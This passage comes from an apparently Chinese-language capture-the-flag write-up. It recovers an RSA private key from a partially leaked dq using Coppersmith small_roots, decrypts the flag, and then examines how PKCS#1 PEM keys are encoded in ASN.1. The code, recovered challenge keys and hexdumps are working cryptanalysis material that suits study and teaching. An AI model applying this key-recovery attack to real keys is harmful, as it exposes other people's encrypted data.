f.monic()</span><br><span class="line">    <span class="attribute">dq_h</span> = f.small_roots(X = <span class="number">2</span>**(<span class="number">512</span>-<span class="number">120</span>),beta=<span class="number">0</span>.<span class="number">4</span>)</span><br><span class="line">    <span class="attribute">if</span> (len(dq_h)) != <span class="number">0</span> :</span><br><span class="line">        <span class="attribute">print</span>(k)</span><br><span class="line">        <span class="attribute">print</span>(dq_h)</span><br><span class="line">        <span class="attribute">break</span></span><br><span class="line">    <span class="attribute">k</span> += <span class="number">1</span></span><br><span class="line"><span class="comment"># M1 MBP上十几、二十分钟</span></span><br><span class="line"><span class="comment"># 59100 times</span></span><br><span class="line"><span class="comment"># 59199</span></span><br><span class="line"><span class="comment"># [8473541887500515583954330543610580482352988466308294038598683460069270949695742839059962985745363324600134512811492604]</span></span><br></pre></td></tr></table></figure><p>所以，得到：</p><ul><li>k = 59199</li><li>dq_h = 8473541887500515583954330543610580482352988466308294038598683460069270949695742839059962985745363324600134512811492604</li></ul><h3 id="part2-recover-PRIVATE-KEY"><a href="#part2-recover-PRIVATE-KEY" class="headerlink" title="part2 - recover PRIVATE KEY"></a>part2 - recover PRIVATE KEY</h3><p>dq高低位都有了，即可得到dq</p><p>又有k，根据式2⃣️$e•d_q+k-1=kq$可得q</p><p>于是n分解成功，所有参数可求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x00d7152506aa9cec05e5335d6b46f5491407c3199fd51091f1f6030d3762b9e03f49c9dcdc075054e0cc148b974b41854bd93b4ee16a2a876ee62005e80ef806b7aa3b64b1bf9b1fa773e353d0cdb9ff9783ddd5f5e67499ad10f361e938d00b82a6a4c42a0535c5e76721798e86b45cd4b8d03b0d7e75c2be8766a1e843bdc641</span></span><br><span class="line">e = <span class="number">0x010001</span></span><br><span class="line"><span class="comment"># qi = inv(q, p)</span></span><br><span class="line">qi = <span class="number">0x00e3016cb3609c1d643c167439c3b938b881f4237f24860d3b1cb85a626d5ccd4726964e0f8270d6c4df9ebfebcc538e4ee5e1a7b7368ede51ec6ae917f78eb598</span></span><br><span class="line"><span class="comment"># dq = d mod (q-1) = 0x........c90bcecf1cbab3358585e8a041d1b1</span></span><br><span class="line">dq_l = <span class="number">0xc90bcecf1cbab3358585e8a041d1b1</span></span><br><span class="line">dq_h = <span class="number">8473541887500515583954330543610580482352988466308294038598683460069270949695742839059962985745363324600134512811492604</span></span><br><span class="line">dq = (dq_h * <span class="number">2</span>**<span class="number">120</span>+dq_l)</span><br><span class="line">k = <span class="number">59199</span></span><br><span class="line">q = (dq*e-<span class="number">1</span>+k)//k</span><br><span class="line">p = n//q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(dp)</span><br><span class="line"><span class="built_in">print</span>(dq)</span><br><span class="line"><span class="built_in">print</span>(qi)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">151036135413139226687867011199700639084856588533884431118047808395603993635242690166659649156476428533386350427603713487259266502837260466348398817558768025404903682189934563578605367223796247470920497617904900418615352839562681665973088711089128789315193951623751145385357347144960284983398745189236464272961</span></span><br><span class="line"><span class="string">65537</span></span><br><span class="line"><span class="string">66980701583036734736960294391078312622827897052791813876359026247918495979594634282982071853820451331222681673373427663666376575651344098661059603483956134335089509308267535247063609325195212704938058730366660923446510585605669518343968880619319880983999690229384618652977238799179660803464509489433199564801</span></span><br><span class="line"><span class="string">12112790828812363063315417237469719611888243756064158121348026938824270601623590308149025542977097905953795136774300936003505715307199422663647014200158449</span></span><br><span class="line"><span class="string">12469144192094336933187534132907623337514842804208163244218540727384104398951558782195384932941310035462094951428865175221316720981428462265191789302379089</span></span><br><span class="line"><span class="string">11498252026215339897996227126317442002148273807959830401838708697653776075624560175939807697631738024706616156507054180549156927547667584459935731684701121</span></span><br><span class="line"><span class="string">11263269100321843418340309033584057768246046953115325020896491943793759194249558697334095131684279304657225064156696057310019203890620314290203835007881649</span></span><br><span class="line"><span class="string">11889246144866782519155392157369478059715977597114885585873502852127888907191116911762955888968046505980125449346852147369649024143226438553109462231463320</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>其后，参考的wp用之，生成私钥，解得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解密</span></span><br><span class="line">n = <span class="number">151036135413139226687867011199700639084856588533884431118047808395603993635242690166659649156476428533386350427603713487259266502837260466348398817558768025404903682189934563578605367223796247470920497617904900418615352839562681665973088711089128789315193951623751145385357347144960284983398745189236464272961</span></span><br><span class="line">t = <span class="number">11889246144866782519155392157369478059715977597114885585873502852127888907191116911762955888968046505980125449346852147369649024143226438553109462231463320</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">dq_l = <span class="number">1043891160170747082120115133012365745</span></span><br><span class="line">        </span><br><span class="line">k = <span class="number">59199</span> </span><br><span class="line">dq_h = <span class="number">8473541887500515583954330543610580482352988466308294038598683460069270949695742839059962985745363324600134512811492604</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line">dq = (dq_h * <span class="number">2</span>**<span class="number">120</span> + dq_l)</span><br><span class="line">q = (GCD((dq * e - <span class="number">1</span> ) * t - k*(<span class="number">1</span>-t) ,n))</span><br><span class="line">p = n//q</span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">d=d</span><br><span class="line">privkey=RSA.construct((<span class="built_in">int</span>(n),e,<span class="built_in">int</span>(d)))  <span class="comment"># 只需要传n、e、d</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;privkey2.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(privkey.export_key(<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line">cipher_text=<span class="built_in">open</span>(<span class="string">r&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">ciphertxt=cipher_text</span><br><span class="line">key=RSA.importKey(<span class="built_in">open</span>(<span class="string">r&quot;privkey2.pem&quot;</span>).read())</span><br><span class="line">cipher=PKCS1_OAEP.new(key)</span><br><span class="line">message=cipher.decrypt(ciphertxt)</span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure><blockquote><p>flag{f1bf5c44-e2b4-424f-baff-b38b73a82e72}</p></blockquote><p>本题按理来说，已结束。</p><p>但接下来，出于对pem私钥结构的好奇，我进行了如下研究。</p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>点开exp所生成的私钥文件，可见</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----<span class="keyword">BEGIN</span> RSA PRIVATE KEY-----</span><br><span class="line">MIICXQIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class="line">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class="line">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class="line">AoGAX2I5MWOog+N5afYcBTPyXLe0hkCjtN2EeJ2R1uYpmJF4n9UanwO5IJhg5CcM</span><br><span class="line">cNo0cPokWUND6Rv9YmY8K6dDEpB+BTULPEoeOJa0l8M0KljcmeBuPSc0YWCYd8Zg</span><br><span class="line">Tc68gtOyT9adcne7<span class="regexp">/IKdh1hO2iAFraAj3bwzuHg97GvM2AECQQDuE+g/</span>vilcoaQx</span><br><span class="line">Sa7jiJcVfKqs7FrfY8rdYIi6iGLRiZxs9dLAtQ52X0l/hxN0nq8Mt9vQFLzhVd7a</span><br><span class="line">Mq69r/JRAkEA50YWmJ3dhsC7SaKP6apHECpoh1GU+ixvptah8qbyjhZ7B+o2xmTf</span><br><span class="line">j6BK<span class="regexp">/Ph+it/g</span>6HxP99nH0YqU2pgxwd4o8QJBANcNtmn13SjmfgljlI3FsSvgm89u</span><br><span class="line">BLvrSbFk5L0SO6kpE9q8xu353qGAe0SuAB4ExPzJC87PHLqzNYWF6KBB0bECQQDb</span><br><span class="line">ikkA7zrPJD2llM+QPLfgvKElc2g8Y9pJQg3RznEKOITp6oe8pR0jtkH5Cdr18bgK</span><br><span class="line">eZdf7DgmzaqoJzl0k3PBAkAEZM8zEVu9kvF83t3Iebxw2oYMAVfyrNHSY/<span class="number">0</span>fZFgf</span><br><span class="line">kVvwlMXuHRs2vp4ro26TSrqpFT1VCXbaw64xspA5FYPK</span><br><span class="line">-----<span class="keyword">END</span> RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>而我们最初想要恢复的私钥文件，如下：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br><span class="line">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class="line">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class="line">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class="line">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class="line">-----<span class="keyword">END</span> RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure><p>它们是不同的！</p><p>但为什么可以解出flag呢？</p><p>原因是，exp里所生成私钥文件里p、q数据和欲恢复的私钥文件里p、q相反</p><p>即： </p><ul><li>$p_{exp} = q_{want}$</li><li>$q_{exp} = p_{want}$</li></ul><p>这就导致了其他参数不同（例如dp、dq也反了，qi也不同），因此base后所生成的私钥文件必然是不完全相同的</p><p><strong>但d是一致的，这就让它可以正常解密出flag</strong></p><p>但我渴求完全恢复出来，如果做到了这会让我感到开心😺</p><p>但简单试了下相关的库，没找到好使的（p、q都反了）</p><p>心血来潮，便<strong>打算自己完整的写个生成私钥的脚本</strong>出来，这虽重复造轮，但对我而言意义非凡</p><p>但现实挺骨感的，通宵写了一夜的bug，就是读取不了，解不出flag🤧</p><p>睡醒后，找了些<a href="https://www.cnblogs.com/yxzamy/p/8961561.html">资料</a>，完善了对私钥数据的认知，总算根据原理成功写出</p><p>先看一个测试性质的私钥文件(十六进制下)内容</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Last login: Sat Jul<span class="number"> 16 </span>18:45:25 on ttys003</span><br><span class="line">(base) wenhui@Harrys-MacBook-Pro ~ % echo -n &#x27;MIICWgIBAAKBgQCcSnm2TgLST457G9sUfy9qyITaX1gGHTYzpe364ho1ayOF0f2U</span><br><span class="line">EDJVO7eUxKHm8qQIoFU6xjdjMZGxaODrVQMqkbBn3EWzCdW2R4B0Kp/YUFlGQoWS</span><br><span class="line">KFUin0D7uWn2DM4jPcpTTOX0Og2VSe0SGQ0spn++rF7buHqxv3c12DTVowIDAQAB</span><br><span class="line">An8FUfFk+h5DCnI84yOR/MJXTenKF3TDCak8YfvcadXoRL1eh6LQ+bwqmEuC6Xe9</span><br><span class="line">9xbC60SNu59LnIjrXIICXCuazAW8JEpQqYoijyAsX7LiFctvKwDh7DP+9g3/4+vN</span><br><span class="line">08C1o+38/Yl/aAZmUHiyZxj1/TPu25fXiHPWEeTXOo3xAkEAx2j4EbnWZuARrtAi</span><br><span class="line">i7T5j2IuhT4UsD+U0YWjFnwQiWpwJ5F67uISFqA6MHn2v0LfVE5eADX9kPYa2FcZ</span><br><span class="line">s0T1SQJBAMik7REmT1d9snwMHS0qqlkeZGCu7MEcJEHAsmIcpZBo6q+CtPJBFikO</span><br><span class="line">VVPK6H01IM97ApActK2OuerbZBUhb4sCQFJfShoIakiUxrkvwRV07KIOLKldu64S</span><br><span class="line">lab3TSc8mJgrH6k4r09+k3pFNcRQnVzkgtyQgsQTiWsYPn6ffD5RfgECQQCrtOCg</span><br><span class="line">PY3GzO4y1FcfsRSJIcY7K1e3RzMMBjFiXyuc8vxsaMobS3IAfqCtDcd6Zz4F8TpX</span><br><span class="line">RAmnQa5/e3Mh1jRTAkApRCqIkHmCu4MA3bNSImZ6Ll7gdB8Ppcu1aYqmLP0XpEvL</span><br><span class="line">VmTRs4AtlHEOi1ZdGuNcoAzIcrK9h4sVnXRo+JTJ&#x27; | base64 -d | hexdump</span><br><span class="line">0000000<span class="number"> 30 </span>82<span class="number"> 02 </span>5a<span class="number"> 02 </span>01<span class="number"> 00 </span>02<span class="number"> 81 </span>81<span class="number"> 00 </span>9c 4a<span class="number"> 79 </span>b6 4e</span><br><span class="line">0000010<span class="number"> 02 </span>d2 4f 8e 7b 1b db<span class="number"> 14 </span>7f 2f 6a c8<span class="number"> 84 </span>da 5f 58</span><br><span class="line">0000020<span class="number"> 06 </span>1d<span class="number"> 36 </span>33 a5 ed fa e2 1a<span class="number"> 35 </span>6b<span class="number"> 23 </span>85 d1 fd 94</span><br><span class="line">0000030<span class="number"> 10 </span>32<span class="number"> 55 </span>3b b7<span class="number"> 94 </span>c4 a1 e6 f2 a4<span class="number"> 08 </span>a0<span class="number"> 55 </span>3a c6</span><br><span class="line">0000040<span class="number"> 37 </span>63<span class="number"> 31 </span>91 b1<span class="number"> 68 </span>e0 eb<span class="number"> 55 </span>03 2a<span class="number"> 91 </span>b0<span class="number"> 67 </span>dc 45</span><br><span class="line">0000050 b3<span class="number"> 09 </span>d5 b6<span class="number"> 47 </span>80<span class="number"> 74 </span>2a 9f d8<span class="number"> 50 </span>59<span class="number"> 46 </span>42<span class="number"> 85 </span>92</span><br><span class="line">0000060<span class="number"> 28 </span>55<span class="number"> 22 </span>9f<span class="number"> 40 </span>fb b9<span class="number"> 69 </span>f6 0c ce<span class="number"> 23 </span>3d ca<span class="number"> 53 </span>4c</span><br><span class="line">0000070 e5 f4 3a 0d<span class="number"> 95 </span>49 ed<span class="number"> 12 </span>19 0d 2c a6 7f be ac 5e</span><br><span class="line">0000080 db b8 7a b1 bf<span class="number"> 77 </span>35 d8<span class="number"> 34 </span>d5 a3<span class="number"> 02 </span>03<span class="number"> 01 </span>00 01</span><br><span class="line">0000090<span class="number"> 02 </span>7f<span class="number"> 05 </span>51 f1<span class="number"> 64 </span>fa 1e<span class="number"> 43 </span>0a<span class="number"> 72 </span>3c e3<span class="number"> 23 </span>91 fc</span><br><span class="line">00000a0 c2<span class="number"> 57 </span>4d e9 ca<span class="number"> 17 </span>74 c3<span class="number"> 09 </span>a9 3c<span class="number"> 61 </span>fb dc<span class="number"> 69 </span>d5</span><br><span class="line">00000b0 e8<span class="number"> 44 </span>bd 5e<span class="number"> 87 </span>a2 d0 f9 bc 2a<span class="number"> 98 </span>4b<span class="number"> 82 </span>e9<span class="number"> 77 </span>bd</span><br><span class="line">00000c0 f7<span class="number"> 16 </span>c2 eb<span class="number"> 44 </span>8d bb 9f 4b 9c<span class="number"> 88 </span>eb 5c<span class="number"> 82 </span>02 5c</span><br><span class="line">00000d0 2b 9a cc<span class="number"> 05 </span>bc<span class="number"> 24 </span>4a<span class="number"> 50 </span>a9 8a<span class="number"> 22 </span>8f<span class="number"> 20 </span>2c 5f b2</span><br><span class="line">00000e0 e2<span class="number"> 15 </span>cb 6f 2b<span class="number"> 00 </span>e1 ec<span class="number"> 33 </span>fe f6 0d ff e3 eb cd</span><br><span class="line">00000f0 d3 c0 b5 a3 ed fc fd<span class="number"> 89 </span>7f<span class="number"> 68 </span>06<span class="number"> 66 </span>50<span class="number"> 78 </span>b2 67</span><br><span class="line">0000100<span class="number"> 18 </span>f5 fd<span class="number"> 33 </span>ee db<span class="number"> 97 </span>d7<span class="number"> 88 </span>73 d6<span class="number"> 11 </span>e4 d7 3a 8d</span><br><span class="line">0000110 f1<span class="number"> 02 </span>41<span class="number"> 00 </span>c7<span class="number"> 68 </span>f8<span class="number"> 11 </span>b9 d6<span class="number"> 66 </span>e0<span class="number"> 11 </span>ae d0 22</span><br><span class="line">0000120 8b b4 f9 8f<span class="number"> 62 </span>2e<span class="number"> 85 </span>3e<span class="number"> 14 </span>b0 3f<span class="number"> 94 </span>d1<span class="number"> 85 </span>a3 16</span><br><span class="line">0000130 7c<span class="number"> 10 </span>89 6a<span class="number"> 70 </span>27<span class="number"> 91 </span>7a ee e2<span class="number"> 12 </span>16 a0 3a<span class="number"> 30 </span>79</span><br><span class="line">0000140 f6 bf<span class="number"> 42 </span>df<span class="number"> 54 </span>4e 5e<span class="number"> 00 </span>35 fd<span class="number"> 90 </span>f6 1a d8<span class="number"> 57 </span>19</span><br><span class="line">0000150 b3<span class="number"> 44 </span>f5<span class="number"> 49 </span>02<span class="number"> 41 </span>00 c8 a4 ed<span class="number"> 11 </span>26 4f<span class="number"> 57 </span>7d b2</span><br><span class="line">0000160 7c 0c 1d 2d 2a aa<span class="number"> 59 </span>1e<span class="number"> 64 </span>60 ae ec c1 1c<span class="number"> 24 </span>41</span><br><span class="line">0000170 c0 b2<span class="number"> 62 </span>1c a5<span class="number"> 90 </span>68 ea af<span class="number"> 82 </span>b4 f2<span class="number"> 41 </span>16<span class="number"> 29 </span>0e</span><br><span class="line">0000180<span class="number"> 55 </span>53 ca e8 7d<span class="number"> 35 </span>20 cf 7b<span class="number"> 02 </span>90 1c b4 ad 8e b9</span><br><span class="line">0000190 ea db<span class="number"> 64 </span>15<span class="number"> 21 </span>6f 8b<span class="number"> 02 </span>40<span class="number"> 52 </span>5f 4a 1a<span class="number"> 08 </span>6a 48</span><br><span class="line">00001a0<span class="number"> 94 </span>c6 b9 2f c1<span class="number"> 15 </span>74 ec a2 0e 2c a9 5d bb ae 12</span><br><span class="line">00001b0<span class="number"> 95 </span>a6 f7 4d<span class="number"> 27 </span>3c<span class="number"> 98 </span>98 2b 1f a9<span class="number"> 38 </span>af 4f 7e 93</span><br><span class="line">00001c0 7a<span class="number"> 45 </span>35 c4<span class="number"> 50 </span>9d 5c e4<span class="number"> 82 </span>dc<span class="number"> 90 </span>82 c4<span class="number"> 13 </span>89 6b</span><br><span class="line">00001d0<span class="number"> 18 </span>3e 7e 9f 7c 3e<span class="number"> 51 </span>7e<span class="number"> 01 </span>02<span class="number"> 41 </span>00 ab b4 e0 a0</span><br><span class="line">00001e0 3d 8d c6 cc ee<span class="number"> 32 </span>d4<span class="number"> 57 </span>1f b1<span class="number"> 14 </span>89<span class="number"> 21 </span>c6 3b 2b</span><br><span class="line">00001f0<span class="number"> 57 </span>b7<span class="number"> 47 </span>33 0c<span class="number"> 06 </span>31<span class="number"> 62 </span>5f 2b 9c f2 fc 6c<span class="number"> 68 </span>ca</span><br><span class="line">0000200 1b 4b<span class="number"> 72 </span>00 7e a0 ad 0d c7 7a<span class="number"> 67 </span>3e<span class="number"> 05 </span>f1 3a 57</span><br><span class="line">0000210<span class="number"> 44 </span>09 a7<span class="number"> 41 </span>ae 7f 7b<span class="number"> 73 </span>21 d6<span class="number"> 34 </span>53<span class="number"> 02 </span>40<span class="number"> 29 </span>44</span><br><span class="line">0000220 2a<span class="number"> 88 </span>90<span class="number"> 79 </span>82 bb<span class="number"> 83 </span>00 dd b3<span class="number"> 52 </span>22<span class="number"> 66 </span>7a 2e 5e</span><br><span class="line">0000230 e0<span class="number"> 74 </span>1f 0f a5 cb b5<span class="number"> 69 </span>8a a6 2c fd<span class="number"> 17 </span>a4 4b cb</span><br><span class="line">0000240<span class="number"> 56 </span>64 d1 b3<span class="number"> 80 </span>2d<span class="number"> 94 </span>71 0e 8b<span class="number"> 56 </span>5d 1a e3 5c a0</span><br><span class="line">0000250 0c c8<span class="number"> 72 </span>b2 bd<span class="number"> 87 </span>8b<span class="number"> 15 </span>9d<span class="number"> 74 </span>68 f8<span class="number"> 94 </span>c9      </span><br><span class="line">000025e</span><br></pre></td></tr></table></figure><p>先声明一下填充的格式参数吧</p><ul><li>前缀，例如<code>02</code>、<code>30</code>，一定存在</li><li>辅助参数，例如<code>81</code>、<code>82</code>,可能存在</li><li>长度，数据十六进制下字节数的十六进制，一定存在</li></ul><p>具体的，当我们有n、e、d…等数据等时候，要如何填充呢？</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">RSAPrivateKey ::= <span class="keyword">SEQUENCE</span> &#123;</span><br><span class="line"><span class="keyword">version</span> <span class="keyword">Version</span>,</span><br><span class="line">modulus <span class="type">INTEGER</span>, <span class="comment">-- n</span></span><br><span class="line">publicExponent <span class="type">INTEGER</span>, <span class="comment">-- e</span></span><br><span class="line">privateExponent <span class="type">INTEGER</span>, <span class="comment">-- d</span></span><br><span class="line">prime1 <span class="type">INTEGER</span>, <span class="comment">-- p</span></span><br><span class="line">prime2 <span class="type">INTEGER</span>, <span class="comment">-- q</span></span><br><span class="line">exponent1 <span class="type">INTEGER</span>, <span class="comment">-- d mod (p-1)</span></span><br><span class="line">exponent2 <span class="type">INTEGER</span>, <span class="comment">-- d mod (q-1)</span></span><br><span class="line">coefficient <span class="type">INTEGER</span>, <span class="comment">-- (inverse of q) mod p</span></span><br><span class="line">otherPrimeInfos OtherPrimeInfos OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照以上结构，我们先不管<code>version Version</code>,看看第一个参数n怎么填充吧（所有数据都是<strong>十六进制</strong>）</p><p>上面私钥里</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">n</span> = <span class="number">0</span>x<span class="number">9</span>c<span class="number">4</span>a<span class="number">79</span>b<span class="number">64</span>e<span class="number">02</span>d<span class="number">24</span>f<span class="number">8</span>e<span class="number">7</span>b<span class="number">1</span>bdb<span class="number">147</span>f<span class="number">2</span>f<span class="number">6</span>ac<span class="number">884</span>da<span class="number">5</span>f<span class="number">58061</span>d<span class="number">3633</span>a<span class="number">5</span>edfae<span class="number">21</span>a<span class="number">356</span>b<span class="number">2385</span>d<span class="number">1</span>fd<span class="number">941032553</span>bb<span class="number">794</span>c<span class="number">4</span>a<span class="number">1</span>e<span class="number">6</span>f<span class="number">2</span>a<span class="number">408</span>a<span class="number">0553</span>ac<span class="number">637633191</span>b<span class="number">168</span>e<span class="number">0</span>eb<span class="number">55032</span>a<span class="number">91</span>b<span class="number">067</span>dc<span class="number">45</span>b<span class="number">309</span>d<span class="number">5</span>b<span class="number">64780742</span>a<span class="number">9</span>fd<span class="number">85059464285922855229</span>f<span class="number">40</span>fbb<span class="number">969</span>f<span class="number">60</span>cce<span class="number">233</span>dca<span class="number">534</span>ce<span class="number">5</span>f<span class="number">43</span>a<span class="number">0</span>d<span class="number">9549</span>ed<span class="number">12190</span>d<span class="number">2</span>ca<span class="number">67</span>fbeac<span class="number">5</span>edbb<span class="number">87</span>ab<span class="number">1</span>bf<span class="number">7735</span>d<span class="number">834</span>d<span class="number">5</span>a<span class="number">3</span></span><br></pre></td></tr></table></figure><p>这里规定，<strong>参数第一个字节（这里是<code>9c</code>）超过<code>0x80</code>就需要高位补充00</strong></p><p>即：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">009</span><span class="keyword">c</span><span class="number">4</span>a<span class="number">79</span>b<span class="number">64e02</span>d<span class="number">24</span>f<span class="number">8e7</span>b<span class="number">1</span>bdb<span class="number">147</span>f<span class="number">2</span>f<span class="number">6</span>ac<span class="number">884</span>da<span class="number">5</span>f<span class="number">58061</span>d<span class="number">3633</span>a<span class="number">5</span>edfae<span class="number">21</span>a<span class="number">356</span>b<span class="number">2385</span>d<span class="number">1</span>fd<span class="number">941032553</span>bb<span class="number">794</span><span class="keyword">c</span><span class="number">4</span>a<span class="number">1e6</span>f<span class="number">2</span>a<span class="number">408</span>a<span class="number">0553</span>ac<span class="number">637633191</span>b<span class="number">168e0</span>eb<span class="number">55032</span>a<span class="number">91</span>b<span class="number">067</span>dc<span class="number">45</span>b<span class="number">309</span>d<span class="number">5</span>b<span class="number">64780742</span>a<span class="number">9</span>fd<span class="number">85059464285922855229</span>f<span class="number">40</span>fbb<span class="number">969</span>f<span class="number">60</span>cce<span class="number">233</span>dca<span class="number">534</span>ce<span class="number">5</span>f<span class="number">43</span>a<span class="number">0</span>d<span class="number">9549</span>ed<span class="number">12190</span>d<span class="number">2</span>ca<span class="number">67</span>fbeac<span class="number">5</span>edbb<span 